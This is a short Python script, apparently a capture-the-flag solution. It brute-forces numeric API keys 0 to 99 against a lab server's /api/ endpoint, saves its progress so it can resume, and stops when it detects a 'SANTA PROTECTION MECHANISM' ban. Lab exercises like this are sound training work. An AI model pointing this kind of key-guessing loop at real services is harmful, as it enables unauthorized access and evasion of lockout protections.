#!/usr/bin/env python3

########################################
# HEADER
import requests as r
import time as t
import json as j

IP = "10.10.132.245"
URL = "http://{}:8000/api/".format(IP)
########################################


########################################
# REQUEST
def doGet(key):
	response = r.get("{}{}".format(URL, key))
	return j.loads(response.text)

########################################
#f.readlines()[-1]

try:
	backup = open("backup", "r")
	backup_number = backup.readlines()[-1]
	backup.close()

except FileNotFoundError:
	backup_exist = False
else:
	backup_exist = True

if backup_exist:
	min = int(backup_number)
else:
	min = 0


for number in range(min, 100, 1):

	response = doGet(number)
	last_number = response["item_id"]
	last_q = response["q"]

	if last_q == "Error. Key not valid!":

		print("FAIL({})".format(last_number))

		with open("backup", "w") as f:
			f.write("{}".format(last_number))

	elif last_q == "SANTA PROTECTION MECHANISM ACTIVATED.":

		print("GOT BANNED...")
		print("RELAUNCH MACHINE.")
		exit()
			
	else:
		print("PASS({})".format(last_number))
		exit()

	t.sleep(0.125)